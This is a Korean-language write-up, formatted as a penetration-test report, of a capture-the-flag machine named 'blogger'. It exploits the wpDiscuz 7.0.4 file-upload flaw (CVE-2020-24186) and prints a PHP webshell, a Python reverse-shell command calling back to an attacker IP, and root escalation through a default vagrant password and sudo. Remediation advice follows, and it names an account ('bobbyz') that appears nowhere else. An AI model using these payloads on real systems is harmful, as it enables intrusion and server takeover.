---
title:  "blogger"
excerpt: "blogger 모의해킹 보고서"

categories:
  - bhpt
tags:
  - [bhpt]

typora-root-url: ../../
 
date: 2020-05-25
last_modified_at: 2020-05-25
---

# blogger 모의해킹 보고서

## 개요

- 기간: 2025/08/03
- 호스트 이름: blogger
- IP 주소: 172.31.211.24
- 목적: 보안 취약점 진단 및 침투 테스트
- 모의해킹 점검자: 조남기

---

### 총평

본 보고서는 2025년 8월 3일 진행된 blogger에 대한 모의해킹 보고서이다.

점검자는 웹 서버 하위 디렉토리(Wordpress)에 접근하여 취약한 플러그인을 이용해 웹 서버의 권한으로 쉘을 획득했다. 이후 `vagrant` 유저 계정이 비밀번호가 변경되지 않은 상태였기 때문에 해당 유저로 권한을 상승한 뒤, 계정에 설정되어 있는 sudo 권한을 이용해 최종적으로 루트 유저의 권한으로 호스트의 쉘을 얻는 것에 성공했다.

결과적으로 점검자는 이번 모의해킹을 통해 외부 공격자가 blogger 호스트를 완벽하게 장악할 수 있는 취약점들을 발견했다. 해당 호스트는 현재 외부 인터넷에 노출되어있는 상태이며 이는 인터넷에서 해당 호스트에 접근 가능한 모든 공격자들에게 해당 호스트가 장악당할 위험이 있는 상태를 의미한다. 인터넷에 노출되어 있는 호스트의 특성상 점검자는 취약점을 발견한 즉시 보안 담당자에게 연락해 취약점 정보와 대응 방안을 제공했다.

---

### 진단 결과 요약

1. 취약한 버전의 워드프레스 플러그인 사용중

  - 중요도: 상
  - 설명: 파일 업로드 기능에 파일 형식 검증이 제대로 구현되어 있지 않아, 이미지 파일로 위장한 PHP 등 실행 파일을 업로드 가능
  - 대응 방안: 7.0.5 버전 이상으로 업데이트 필요


2. 아이디와 비빌번호가 변경되지 않은 기본 계정 존재

  - 중요도: 중
  - 설명: 프로그램 설치나 운영체제 수정을 위해 루트 권한이나, 높은 권한을 가지고 있는 vagrant 로컬 유저의 비밀번호가 변경되지 않아 권한 상승에 악용될 수 있음
  - 대응 방안: 해당 계정 비밀번호 즉시 변경


3. 일반 계정에 sudo 권한 부여됨

  - 중요도: 상
  - 설명: 일반(비관리자) 계정에 sudo 권한을 주면 해당 계정이 시스템 전체 관리자(루트 권한) 역할로 행위 가능
  - 대응 방안: 일반 사용자 계정에 sudo 권한 부여 금지, 운영상 불필요한 모든 sudoer 즉시 제거

<div style="page-break-after: always;"></div>

---

## 모의해킹 수행 내용

1. 정보 수집
2. 웹 페이지 탐색 및 하위 디렉토리 조사하여 숨겨진 /blog 디렉토리 발견
3. 프론트엔드를 정상화를 위해 점검자 칼리에서 웹 아이피와 호스트 맵핑함
4. 호스트 기반의 주소로 접속한뒤, wpscan 툴을 이용하여 취약한 플러그인(wpdiscuz) 발견
5. 익스플로잇을 실행하여 리버스 쉘을 업로드하고 실행시켜 해당 웹 쉘 획득함
6. passwd 유저 목록에서 vagrant 유저 발견하여 기본 계정 `vagrant:vargrant`으로 유저 변경함
7. sudo 권한을 이용하여 루트 유저 권한 상승에 성공하여 모의해킹 종료함.

---

### 정보 수집

#### 포트 스캐닝

nmap

```
└─$ nmap -p 22,80 -sV -sC -Pn -n 172.31.211.24 -oA tcpDetailed --min-rate 2000  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 16:34 KST
Nmap scan report for 172.31.211.24
Host is up (0.054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:6e:94:36:30:e7:4a:7d:b8:f1:e0:9c:53:5d:c7:e7 (RSA)
|   256 ea:b4:1d:9d:cb:f9:cb:68:28:86:f8:8b:44:73:3f:6e (ECDSA)
|_  256 7d:58:43:14:e6:91:85:c4:ac:55:c4:d1:d7:c2:a1:9a (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Blogger | Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds
```

- 스캔 결과 포트 22에는 OpenSSH 7.2 버전, 포트 80에는 Apache 기반의 웹 서버가 가동 중인 것을 확인했다. OpenSSH에는 당장 가용할만한 취약점이 존재하지 않아 웹 서버 위주로 정보 수집을 이어갔다.

<div style="page-break-after: always;"></div>

---

#### 웹(80)

- 웹 서버에 접속하여 더 자세한 정보 수집을 위해 `gobuster` 툴을 이용하여 디렉토리 목록을 조사했다. 

gobuster

```
└─$ gobuster dir -u http://172.31.211.24:80/ -w /usr/share/wordlists/dirb/common.txt | tee gobuster-80 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.31.211.24:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://172.31.211.24/assets/]
/css                  (Status: 301) [Size: 312] [--> http://172.31.211.24/css/]
/images               (Status: 301) [Size: 315] [--> http://172.31.211.24/images/]
/index.html           (Status: 200) [Size: 46199]
/js                   (Status: 301) [Size: 311] [--> http://172.31.211.24/js/]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

- 다양한 디렉토리를 발견하고 해당 페이지로 접속하여 파일 목록을 조사했다.
- 아래 이미지는 `assets` 디렉토리이고 각각 페이지에 들어가면 디렉토리 리스트가 존재했다.
- ![alt text](/images/2025-08-23-test11/image.png)

- /assets/fonts 디렉토리에 보면 /blog 라는 디렉토리가 숨겨져 있는 것을 볼 수 있다.
- /assets/blog를 방문하면 프론트엔드가 제대로 작동하지 않아 CSS, JS, HTML 등이 모두 깨진채로 나오게 된다. "소스코드 보기"를 눌러 확인해보면 현재 프론트엔드 코드가 http://blogger.thm/ 라는 호스트에서 디렉토리 및 파일들을 불러오고 있기 때문에, 아이피주소 기반으로 웹 서버를 방문하면 호스트 이름이 들어간 파일이나 디렉토리들이 제대로 불러와지고 있지 않고 있다.
- 하나의 아이피주소에 다양한 호스트이름을 붙이고, 각 호스트이름 마다 각기 다른 웹 디렉토리를 사용할 수 있게 해주는 기술을 버츄얼 호스팅 (Virtual Hosting; vhost)라고 부르는데, 해당 호스트를 아이피주소가 아닌 호스트 이름으로 방문할 수 있도록 현재 테스터 호스트의 /etc/hosts 파일에 대상 아이피주소 + 호스트이름을 추가해줬다.

```
# Vim 등의 에디터를 이용해 <IP주소 호스트이름> 추가... 

└─# cat /etc/hosts
172.31.211.24 blogger.thm
127.0.0.1       localhost
127.0.1.1       kali
```

- /etc/hosts를 업데이트 한 뒤, 호스트이름을 기반으로 http://blogger.thm/assets/fonts/blog에 방문했다. 깨지는 것 없이 렌더링 된 모습.
- ![alt text](/images/2025-08-23-test11/image-1.png)
- `wpscan` 으로 더 조사해본 결과 WordPress version 4.9.8 을 사용 중이고, 취약한 플러그인이 설치되어있는 것을 확인했다.

wpscan 플러그인 조사

```
└─# wpscan --url http://blogger.thm/assets/fonts/blog/ -e ap --plugins-detection aggressive
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/
 | Last Updated: 2025-07-15T18:17:00.000Z
 | Readme: http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.5
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.8 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt

[+] wpdiscuz
 | Location: http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/
 | Last Updated: 2025-06-29T17:10:00.000Z
 | Readme: http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.6.33
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt

```

<div style="page-break-after: always;"></div>

---

### 취약점 진단

- `searchsploit` 으로 `wpdiscuz 7.0.4` 플러그인 취약점 탐색

```
└─$ searchsploit wpdiscuz       
----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated)                | php/webapps/49962.sh
WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)                | php/webapps/49967.py
Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Upload (Metasploit)     | php/webapps/49401.rb
----------------------------------------------------------------------------------------- ---------------------------------
```

---

### 취약점 & 익스플로잇 분석

#### wpdiscuz, CVE-2020-24186

- CVE-2020-24186는 워드프레스 플러그인 wpDiscuz(7.0~7.0.4 버전)에 존재하는 치명적인 원격 코드 실행(RCE) 취약점이다. 이 취약점으로 인해 “인증되지 않은 공격자”가 악성 PHP 파일을 포함한 임의의 파일을 서버에 업로드하고, 원격에서 실행하여 웹 서버를 완전히 장악할 수 있다.

- 주요 내용:
  - 대상 플러그인: wpDiscuz 7.0~7.0.4 (댓글 관리용 워드프레스 플러그인)
  - 공격 방식: 파일 업로드 기능(wmuUploadFiles AJAX action)에 파일 형식 검증이 제대로 구현되어 있지 않아, 이미지 파일로 위장한 PHP 등 실행 파일을 업로드할 수 있다. 업로드된 파일의 경로가 응답에 노출되기 때문에, 공격자는 바로 경로를 알아내 실행시킬 수 있다.
  - 취약점 영향: 공격자는 웹쉘(webshell) 또는 백도어 파일을 심어 서버 내 모든 명령을 실행할 수 있어, 사이트 탈취·데이터 유출·추가 공격 통로 확보 등이 가능해진다.
  - CVSS 점수: 10.0 (Critical)로, 자동 대량 악용 사례가 실제로 보고됨.
  - 패치 여부: 7.0.5 버전에서 패치됨. 반드시 최신 버전으로 업데이트 필요.

---

#### 49967.py 익스플로잇 분석

- 위 익스플로잇들은 모두 파일 업로드 취약점을 공격하는 코드이다. 그 중 파이썬 익스플로잇을 사용해 공격을 진행하는데, 해당 코드를 분석해보면 알 수 있지만 이 익스플로잇은 웹쉘 바로 앞에 이미지 파일의 매직 바이트(GIF89A)를 붙이는 방식으로 업로드 우회를 한다.
  - ![alt text](/images/2025-08-23-test11/image-2.png)

- 기본적으로 사용되는 페이로드는 PHP 한줄 웹쉘 - <? php system($_GET['cmd']) ?> - 이기 때문에 뒤에 cmd를 붙여 원하는 코드를 실행할 수 있다.
- ![alt text](/images/2025-08-23-test11/image-3.png)

<div style="page-break-after: always;"></div>

---

### 취약점 공격 및 초기 침투

- 49967.py 익스플로잇을 실행해보면 업로드는 성공하지만 코드 실행은 실패한다.

```
└─# python3 49967.py -u http://blogger.thm/assets/fonts/blog -p '/?p=25'                                                                  
---------------------------------------------------------------                                                                           
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution                                                                               
[-] File Upload Bypass Vulnerability - PHP Webshell Upload                                                                                
[-] CVE: CVE-2020-24186                                                                                                                   
[-] https://github.com/hevox                                                                                                              
---------------------------------------------------------------                                                                           
                                                                                                                                          
[+] Response length:[59090] | code:[200]                                                                                                  
[!] Got wmuSecurity value: aeff0d15e5                                                                                                     
[!] Got wmuSecurity value: 25                                                                                                             
                                                                                                                                          
[+] Generating random name for Webshell...                                                                                                
[!] Generated webshell name: avgfvavizztmpgf                                                                                              
                                                                                                                                          
[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blogger.thm/assets/fonts/blog/wp-content/uploads/2024/06/avgfvavizztmpgf-1717746461.591.php&quot; 

> whoami

[x] Failed to execute PHP code...
```

- 하지만 실제 업로드된 웹쉘의 위치로 가 cmd GET 파라미터를 활용하면 코드 실행이 정상적으로 된다.

```
└─$ curl http://blogger.thm/assets/fonts/blog/wp-content/uploads/2025/08/fmscpyyappgkmrx-1754210413.3213.php?cmd=id;
GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Python3 가 설치되어있는지 확인하기
└─$ curl http://blogger.thm/assets/fonts/blog/wp-content/uploads/2025/08/fmscpyyappgkmrx-1754210413.3213.php?cmd=python3%20--version;
GIF689a;

Python 3.5.2
```

- 이후 revshells.com 의 리버스 쉘을 URL 형식으로 인코딩하여 리버스쉘을 실행시킨다.

```
└─$ curl http://blogger.thm/assets/fonts/blog/wp-content/uploads/2025/08/fmscpyyappgkmrx-1754210413.3213.php?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.8.1.96%22%2C9999%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27;
```

- 리버스쉘을 획득하는 데 성공한 뒤 Fully pty shell로 업그레이드를 진행했다.

```
python3 -c 'import pty; pty.spawn("/bin/bash")' 
ctrl+z 
stty raw -echo; fg 
reset 
xterm-256color
```

  - ![alt text](/images/2025-08-23-test11/image-4.png)

<div style="page-break-after: always;"></div>

---

### 권한 상승

- 권한 상승을 시도하기 위해 `/etc/passwd`의 유저 목록을 확인했다.

```
<ress/assets/fonts/blog/wp-content/uploads/2025/08$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash

[ . . . ]

vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
james:x:1002:1002:James M Brunner,,,:/home/james:/bin/bash
```

- vagrant는 데브옵스 기술로서, 가상 머신이나 컨테이너를 만들 때 자주 사용된다. 잘못 설정된 경우 기본 계정 정보인 `vagrant:vagrant` 이름 + 비밀번호가 사용될 때가 있다. vagrant 로컬 유저의 경우 프로그램 설치나 운영체제 수정을 위해 루트 권한이나, 높은 권한을 가지고 있는 경우가 많기 때문에 먼저 vagrant 유저로의 권한 상승을 시도했다.

```
<ress/assets/fonts/blog/wp-content/uploads/2025/08$ su vagrant
Password: 
<ress/assets/fonts/blog/wp-content/uploads/2025/08$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
```

- 이후 `sudo -l` 명령어로 sudo 권한을 확인한후 루트 유저로의 권한 상승에 성공했다.

```
ress/assets/fonts/blog/wp-content/uploads/2025/08$ sudo -l
Matching Defaults entries for vagrant on
    ip-172-31-211-24.ap-northeast-2.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on
        ip-172-31-211-24.ap-northeast-2.compute.internal:
    (ALL) NOPASSWD: ALL
<ress/assets/fonts/blog/wp-content/uploads/2025/08$ sudo /bin/bash
<ress/assets/fonts/blog/wp-content/uploads/2025/08# id 
uid=0(root) gid=0(root) groups=0(root)

```

<div style="page-break-after: always;"></div>

---

#### 플래그..

- 이후 취약점을 더 찾아 보기 위해 루트유저의 홈디렉토리의 `root.txt` 파일을 발견하고 base64로 인코딩 되어 보여 디코딩을 시도했는데, 플래그를 발견했다.

```
root@ip-172-31-211-24:/root# ll root.txt
-rw-r--r--  1 root root  501 Apr  2  2021 root.txt
root@ip-172-31-211-24:/root# cat root.txt 
SGV5IFRoZXJlLApNeXNlbGYgR2F1cmF2IFJhaiwgSGFja2VyLCBQcm9ncmFtbWVyICYgRnJlZUxhbmNlci4KVGhpcyBpcyBteSBmaXJzdCBhdHRlbXB0IHRvIGNyZWF0ZSBhIHJvb20uIExldCBtZSBrbm93IGlmIHlvdSBsaWtlZCBpdC4KQW55IGlzc3VlIG9yIHN1Z2dlc3Rpb25zIGZvciBtZS4gUGluZyBtZSBhdCB0d2l0dGVyCgpUd2l0dGVyOiBAdGhlaGFja2Vyc2JyYWluCkdpdGh1YjogQHRoZWhhY2tlcnNicmFpbgpJbnN0YWdyYW06IEB0aGVoYWNrZXJzYnJhaW4KQmxvZzogaHR0cHM6Ly90aGVoYWNrZXJzYnJhaW4ucHl0aG9uYW55d2hlcmUuY29tCgoKSGVyZSdzIFlvdXIgRmxhZy4KZmxhZ3tXMzExX0QwbjNfWTB1X1AzbjN0cjR0M2RfTTMgOil9Cg==
root@ip-172-31-211-24:/root# base64 -d root.txt 
Hey There,
Myself Gaurav Raj, Hacker, Programmer & FreeLancer.
This is my first attempt to create a room. Let me know if you liked it.
Any issue or suggestions for me. Ping me at twitter

Twitter: @thehackersbrain
Github: @thehackersbrain
Instagram: @thehackersbrain
Blog: https://thehackersbrain.pythonanywhere.com


Here's Your Flag.
flag{W311_D0n3_Y0u_P3n3tr4t3d_M3 :)}
```

<div style="page-break-after: always;"></div>

---

## 취약점 및 대응 방안

1. 취약한 버전의 워드프레스 플러그인 사용중

```
└─# wpscan --url http://blogger.thm/assets/fonts/blog/ -e ap --plugins-detection aggressive
[i] Plugin(s) Identified:
[ . . . ]

[+] wpdiscuz
 | Location: http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/
 | Last Updated: 2025-06-29T17:10:00.000Z
 | Readme: http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.6.33
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt

```

  - 대응 방안: 7.0.5 버전 이상으로 업데이트 필요

  - 업데이트 방법 : 

    - (1) 워드프레스 관리자 페이지에서 업데이트

    1.	워드프레스 대시보드에 로그인
       •	관리자 계정으로 로그인
    2.	플러그인 메뉴 이동
       •	메뉴에서 “플러그인 > 설치된 플러그인”을 클릭
    3.	wpDiscuz 플러그인 찾기
       •	wpDiscuz 항목 옆에 “업데이트” 링크가 표시되면 클릭하여 즉시 업데이트
    4.	업데이트 완료 후 플러그인 정상 작동 확인
       •	새 버전이 적용되었는지 확인하고, 댓글 등 주요 기능을 테스트

    - (2) FTP/SFTP 직접 업데이트(수동)

    1.	공식 사이트에서 최신 버전(.zip) 다운로드
       •	https://wordpress.org/plugins/wpdiscuz/ 에서 최신 버전을 다운로드
    2.	서버 접속 및 기존 플러그인 백업
       •	FTP/SFTP로 접속하여 `/wp-content/plugins/wpdiscuz` 폴더를 로컬 PC로 복사해 둠
    3.	기존 폴더 삭제 후, 새 버전 업로드
       •	서버의 기존 `wpdiscuz` 폴더를 삭제하고, 다운로드 받은 최신 버전 압축해제 후 업로드
    4.	워드프레스 대시보드에서 플러그인 활성화/테스트
       •	정상적으로 활성화되고 작동하는지 다시 한번 확인

<div style="page-break-after: always;"></div>

---

2. 아이디와 비빌번호가 변경되지 않은 기본 계정 존재

```
<ress/assets/fonts/blog/wp-content/uploads/2025/08$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash

[ . . . ]

vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash

---
<ress/assets/fonts/blog/wp-content/uploads/2025/08$ su vagrant
Password: vagrant
<ress/assets/fonts/blog/wp-content/uploads/2025/08$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
```

  - 대응 방안: 해당 계정 비밀번호 즉시 변경, 8자 이상, 영문 대/소문자, 숫자, 특수문자 포함

```
passwd vagrant
```

<div style="page-break-after: always;"></div>

---

3. 일반 계정에 sudo 권한 부여됨

```
ress/assets/fonts/blog/wp-content/uploads/2025/08$ sudo -l
Matching Defaults entries for vagrant on
    ip-172-31-211-24.ap-northeast-2.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on
        ip-172-31-211-24.ap-northeast-2.compute.internal:
    (ALL) NOPASSWD: ALL
```

  - 대응 방안
    - 불필요한 사용자 및 그룹에 sudo 권한을 부여하지 않음
    - ‘ALL’ 명령 허용, ‘NOPASSWD’ 옵션 무분별 사용 자제
    - bobbyz 계정의 sudo 권한 회수 
      - root 계정으로 접속 후 `sudo visudo` 명령어로 파일 열기 -> 회수 하고 싶은 계정 부분 `#`(주석) 처리
    - 부득이하게 sudo 권한 부여 해야한다면 명령 경로 전체 지정
      - `/etc/sudoers`에 허용할 명령은 항상 전체 경로(`/usr/bin/xxx`)로 작성
    - 다른 취약점 대응 위해 `sudo` 최신 버전으로 업그레이드

```
sudo apt update
sudo apt install --only-upgrade sudo
sudo -V        # sudo 버전 확인
```

<div style="page-break-after: always;"></div>

---

## 아티팩트 (Artifact) 생성

- 없음

---

## 레퍼런스

- CVE-2020-24186 취약점 설명: https://nvd.nist.gov/vuln/detail/CVE-2020-24186
